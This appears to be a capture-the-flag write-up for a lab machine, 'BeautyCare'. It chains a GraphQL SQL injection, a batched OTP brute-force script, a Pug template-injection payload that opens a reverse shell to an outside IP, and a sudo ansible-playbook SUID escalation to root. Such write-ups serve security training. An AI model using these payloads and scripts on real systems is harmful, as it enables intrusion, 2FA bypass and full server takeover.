# BeautyCare

## Initial Foothold

Doing an `nmap` scan showed an Nginx server at port 80.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: El BeautyCare
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Running a GoBuster scan on the webserver revealed the `/admin` and `/graphql` endpoints.

When visiting the `/admin` endpoint, we see a login panel. The credentials are sent as a POST request to the `/graphql` endpoint.

{% code overflow="wrap" %}
```http
POST /graphql HTTP/1.1
Host: 10.129.255.102
Content-Length: 118
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.72 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://10.129.255.102
Referer: http://10.129.255.102/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

{"query":"mutation {\n    LoginUser(username: \"test\", password: \"test\"){\n        message,\n        token    \n}\n}"}
```
{% endcode %}

By fuzzing both the `username` and `password` fields, we quickly find that there is an SQL injection through the `username` field.

{% code overflow="wrap" %}
```
Error: ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1
```
{% endcode %}

To quickly exploit this, I used SQLmap and specified a custom injection point:

{% code overflow="wrap" %}
```http
POST /graphql HTTP/1.1
Host: 10.129.255.102
Content-Length: 118
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.72 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://10.129.255.102
Referer: http://10.129.255.102/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

{"query":"mutation {\n    LoginUser(username: \"*\", password: \"test\"){\n        message,\n        token    \n}\n}"}
```
{% endcode %}

These gave the credentials `john:iamcool`. Upon logging in, though, we are prompted for our 2FA OTP. Since it was a 4-digit number, there were 10,000 possible OTP codes.

In GraphQL, a mechanism known as [batching](https://www.apollographql.com/blog/apollo-client/performance/batching-client-graphql-queries/) allows us to send multiple GraphQL queries in a single HTTP request. So instead of sending a single `verify2FA` mutation like so:

{% code overflow="wrap" %}
```json
{"query":"mutation {verify2FA(otp: \"0000\"){ message, token }"}
```
{% endcode %}

We could send multiple mutations like so:

{% code overflow="wrap" %}
```json
{"query":"mutation {verify0: verify2FA(otp: \"0000\"){ message, token } verify1: verify2FA(otp: \"0001\"){ message, token }"}
```
{% endcode %}

This allows us to bruteforce a significant number of OTP codes in a single request, reducing the total number of HTTP requests needed. However, due to limitations on the total length of a single request body, we still need to split the search space into multiple requests.

In the following script, we split the search space into 10 HTTP requests, each testing 1,000 OTP codes.

```python
import requests
import time

for i in range(10):
    res = ""
    for i in range(i * 1000, (i + 1) * 1000):
        res += f"verify{i}: verify2FA(otp: \"{str(i).zfill(4)}\"){{ message, token }}"

    qry = "mutation {" + res + "}"

    r = requests.post("http://10.129.255.102/graphql",
        json={"query": qry},
        headers={"Content-Type": "application/json"},
        cookies={
            "session": "<SESSION-COOKIE>"
        }, 
        proxies={'http': 'http://localhost:8080'}
    )

    data = r.json()['data']
    for key, value in data.items():
        if value != None:
            print(key, value)

    time.sleep(2)
```

This allows us to find the correct code in a couple of seconds.

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Now, we can head over to the admin dashboard at `/admin/dashboard`. We are presented with a UI for saving and previewing email templates, which leads us to believe that there might be an [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) vulnerability.

From the HTTP response headers, we could also gather that the server was running an Express.js application, allowing us to narrow down the templating engine as [Pug](https://pugjs.org/).

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Using the following payload, we can spawn a reverse shell when previewing the template, allowing us to get a shell as `john`.

{% code overflow="wrap" %}
```java
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('bash -i >& /dev/tcp/10.10.14.33/1337 0>&1')}()}
```
{% endcode %}

## Privilege Escalation

Running LinPEAS on the target server revealed that `john` can run `ansible-playbook` with sudo privileges.

```
User john may run the following commands on beautycare:
    (root) NOPASSWD: /usr/bin/ansible-playbook
```

To exploit this, we create a playbook that assigns SUID permissions to `/bin/bash`.

```yaml
---                                                                                                               
- name: shell                                                                                                  
  hosts: localhost
  become: yes

  tasks:
  - name: hack
    shell: "cp /bin/bash . && chmod +sx bash"
```

Then we can just run `sudo ansible-playbook pwn.yml` to run the playbook's command as `root`, and then `bash -p` to gain a bash shell with root privileges through the SUID permission.
